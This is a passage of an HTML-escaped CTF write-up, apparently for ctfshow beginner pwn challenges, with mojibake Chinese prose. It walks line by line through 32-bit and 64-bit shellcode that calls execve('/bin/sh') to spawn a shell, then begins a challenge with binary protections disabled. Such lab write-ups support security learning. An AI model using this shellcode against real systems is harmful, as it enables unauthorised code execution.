&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™ä¸¤è¡Œä»£ç ä½¿ç”¨å¼‚æˆ–æ“ä½œå°† ecx å’Œ edx å¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸ºé›¶ã€‚ ecx å’Œ edx åˆ†åˆ«å°†ç”¨ä½œ execveç³»ç»Ÿè°ƒç”¨çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚åœ¨æ­¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†å®ƒä»¬è®¾ç½®ä¸º NULLï¼Œè¡¨ç¤ºæ²¡æœ‰å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚ï¼ˆè¿™ä¸å°±æ˜¯æ‰‹æ•²shellcodeçš„é‚£æ®µä»£ç å—ï¼Ÿ&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/#%e9%80%90%e8%a1%8c%e8%a7%a3%e6%9e%90%e6%89%8b%e6%95%b2shellcode&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;åœ¨ä¸€å¼€å§‹çš„wpï¼šPWN_024&lt;/a&gt;ï¼‰è¿‡è¿™ä¹ˆä¹…äº†å¿˜å¾—å·®ä¸å¤šäº†ï¼Œåœ¨è¿™é‡Œå›å¿†ä¸€ä¸‹å•Šã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™ä¸¤è¡Œä»£ç å°†å€¼ 11 ï¼ˆ 0xb ï¼‰å‹å…¥æ ˆä¸­ï¼Œç„¶åä»æ ˆä¸­å¼¹å‡ºåˆ°å¯„å­˜å™¨ eax ã€‚ eax å¯„å­˜å™¨å°†ç”¨ä½œç³»ç»Ÿè°ƒç”¨å·ï¼Œ 11 è¡¨ç¤º execve ç³»ç»Ÿè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç è§¦å‘ä¸­æ–­ 0x80 ï¼Œè¿™æ˜¯Linuxç³»ç»Ÿä¸­ç”¨äºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„ä¸­æ–­æŒ‡ä»¤ã€‚é€šè¿‡è®¾ç½®é€‚å½“çš„å¯„å­˜å™¨å€¼ï¼ˆ eax ã€ ebx ã€ ecx ã€ edx ï¼‰ï¼Œ int 0x80 æŒ‡ä»¤å°†æ‰§è¡Œ execve(&amp;quot;/bin/sh&amp;rdquo;, NULL, NULL) ç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œå¯åŠ¨ä¸€ä¸ªæ–°çš„ shell è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;æ€»ç»“èµ·æ¥ï¼Œè¿™æ®µæ±‡ç¼–ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨åœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œ execve(&amp;quot;/bin/sh&amp;rdquo;, NULL,NULL) ï¼Œå³æ‰“å¼€ä¸€ä¸ªæ–°çš„shellè¿›ç¨‹ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_057&#34;&gt;PWN_057
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå…ˆäº†è§£ä¸€ä¸‹ç®€å•çš„64ä½shellcodeå§ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_057&#34; &gt;PWN_057&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDA64ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/197.png&#34;
	width=&#34;775&#34;
	height=&#34;91&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/197_hu_4ea3113fe1deac76.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/197_hu_85677d2664cb8eb9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;startå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;851&#34;
		data-flex-basis=&#34;2043px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&#34;å†…è”æ±‡ç¼–-syscall-linux---çš„ä½œç”¨&#34;&gt;å†…è”æ±‡ç¼– &lt;code&gt;syscall; LINUX -&lt;/code&gt; çš„ä½œç”¨
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;syscall&lt;/code&gt;ï¼šæ˜¯ x86-64 æ¶æ„ä¸‹çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œç”¨äºè§¦å‘ Linux ç³»ç»Ÿè°ƒç”¨ï¼ˆè°ƒç”¨æ“ä½œç³»ç»Ÿå†…æ ¸æä¾›çš„åŠŸèƒ½ï¼Œå¦‚è¿›ç¨‹é€€å‡ºã€æ–‡ä»¶æ“ä½œç­‰ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LINUX -&lt;/code&gt; å¯èƒ½æ˜¯ç®€åŒ–æˆ–æ³¨é‡Šæ®‹ç•™ï¼Œå®é™…æœ‰æ•ˆçš„æŒ‡ä»¤åªæœ‰ &lt;code&gt;syscall&lt;/code&gt;ã€‚ç³»ç»Ÿè°ƒç”¨çš„å…·ä½“åŠŸèƒ½ç”± &lt;code&gt;rax&lt;/code&gt; å¯„å­˜å™¨çš„å€¼å†³å®šï¼ˆä¾‹å¦‚ &lt;code&gt;rax=60&lt;/code&gt; è¡¨ç¤º &lt;code&gt;exit&lt;/code&gt; ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºç»ˆæ­¢å½“å‰è¿›ç¨‹ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;æ€»çš„æ¥è¯´è¿™ä¿©é¢˜æ˜¯è®©æˆ‘ä»¬è®¤è¯†shellcodeçš„æ ·å­ï¼Œä»¥ä¾¿åé¢ä½¿ç”¨&amp;hellip;&lt;/p&gt;
&lt;p&gt;expåŒä¸Šã€‚&lt;/p&gt;
&lt;p&gt;é‡ç‚¹è¿˜æ˜¯çœ‹æ±‡ç¼–ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rbx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;/bin//sh&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rbx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;59&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™æ®µä»£ç æ˜¯x86-64æ±‡ç¼–è¯­è¨€çš„ä»£ç ï¼Œç”¨äºåœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œ &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL,NULL) &lt;/code&gt;ã€‚è®©æˆ‘ä»¬é€è¡Œè§£æä»£ç çš„åŠŸèƒ½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°† rax å¯„å­˜å™¨çš„å€¼ï¼ˆé€šå¸¸ç”¨äºå­˜æ”¾å‡½æ•°è¿”å›å€¼ï¼‰å‹å…¥æ ˆä¸­ã€‚è¿™é‡Œçš„ç›®çš„æ˜¯ä¿ç•™ rax çš„å€¼ï¼Œä»¥ä¾¿åç»­ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™ä¸¤è¡Œä»£ç ä½¿ç”¨å¼‚æˆ–æ“ä½œå°† rdx å’Œ rsi å¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸ºé›¶ã€‚ rdx å’Œ rsi åˆ†åˆ«å°†ç”¨ä½œ execveç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸‰ä¸ªå’Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ç¯å¢ƒå˜é‡å’Œå‘½ä»¤è¡Œå‚æ•°ã€‚åœ¨æ­¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†å®ƒä»¬è®¾ç½®ä¸º NULLï¼Œè¡¨ç¤ºæ²¡æœ‰ç¯å¢ƒå˜é‡å’Œå‘½ä»¤è¡Œå‚æ•°ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rbx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#39;/bin//sh&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°†å­—ç¬¦ä¸² &amp;lsquo;/bin//sh&amp;rsquo; çš„åœ°å€èµ‹å€¼ç»™ rbx å¯„å­˜å™¨ã€‚å­—ç¬¦ä¸² &amp;lsquo;/bin//sh&amp;rsquo; æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚åœ¨x86-64æ±‡ç¼–ä¸­ï¼Œå­—ç¬¦ä¸²è¢«å½“ä½œåœ°å€å¤„ç†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rbx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°† &lt;code&gt;rbx &lt;/code&gt;å¯„å­˜å™¨çš„å€¼ï¼ˆå­—ç¬¦ä¸² &amp;lsquo;/bin//sh&amp;rsquo; çš„åœ°å€ï¼‰å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯ä¸ºäº†å°†å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¼ é€’ç»™ &lt;code&gt;execve&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™ä¸¤è¡Œä»£ç å°†æ ˆé¡¶çš„åœ°å€ï¼ˆå³å­—ç¬¦ä¸² &amp;lsquo;/bin//sh&amp;rsquo; çš„åœ°å€ï¼‰å¼¹å‡ºåˆ° &lt;code&gt;rdi&lt;/code&gt; å¯„å­˜å™¨ã€‚ rdi å¯„å­˜å™¨å°†ç”¨ä½œexecve ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;59&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°† al å¯„å­˜å™¨è®¾ç½®ä¸ºå€¼ 59 ï¼Œ 59 æ˜¯ execve ç³»ç»Ÿè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚é€šè¿‡è®¾ç½®é€‚å½“çš„å¯„å­˜å™¨å€¼ï¼ˆ &lt;code&gt;rax &lt;/code&gt;ã€ &lt;code&gt;rdi &lt;/code&gt;ã€ &lt;code&gt;rsi&lt;/code&gt; ã€&lt;code&gt;rdx&lt;/code&gt;ï¼‰ï¼Œ syscall æŒ‡ä»¤å°†æ‰§è¡Œ &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL) &lt;/code&gt;ç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œå¯åŠ¨ä¸€ä¸ªæ–°çš„ shell è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;æ€»ç»“èµ·æ¥ï¼Œè¿™æ®µæ±‡ç¼–ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨åœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œ execve(&amp;quot;/bin/sh&amp;rdquo;, NULL,NULL) ï¼Œå³æ‰“å¼€ä¸€ä¸ªæ–°çš„shellè¿›ç¨‹ã€‚ä¸å‰ä¸€ä¸ªç¤ºä¾‹ç›¸æ¯”ï¼Œè¿™æ®µä»£ç æ˜¯x86-64æ¶æ„ä¸‹çš„æ±‡ç¼–ä»£ç ï¼Œä½¿ç”¨é€šç”¨å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_058&#34;&gt;pwn_058
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š32ä½ æ— é™åˆ¶ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_058&#34; &gt;PWN_058&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;32ä½ä»…éƒ¨åˆ†å¼€å¯RELROï¼Œå…¶ä»–ä¿æŠ¤å…¨å…³ï¼Œå¹¶ä¸”æœ‰å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œæ®µã€‚å¯ä»¥ç”¨shellcodeã€‚&lt;/p&gt;
&lt;p&gt;çœ‹ä¸åˆ°æºç ï¼Œé‚£å°±åªèƒ½çœ‹æ±‡ç¼–ä»£ç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/198.png&#34;
	width=&#34;620&#34;
	height=&#34;1030&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/198_hu_ddb0945d713ff3cc.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/198_hu_d19be5ee44d7ddc0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;NASM&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;60&#34;
		data-flex-basis=&#34;144px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¤§è‡´å°±æ˜¯ï¼šä¼šè°ƒç”¨putså‡½æ•°&lt;/p&gt;
&lt;p&gt;çœ‹textæ®µï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/199.png&#34;
	width=&#34;984&#34;
	height=&#34;558&#34;
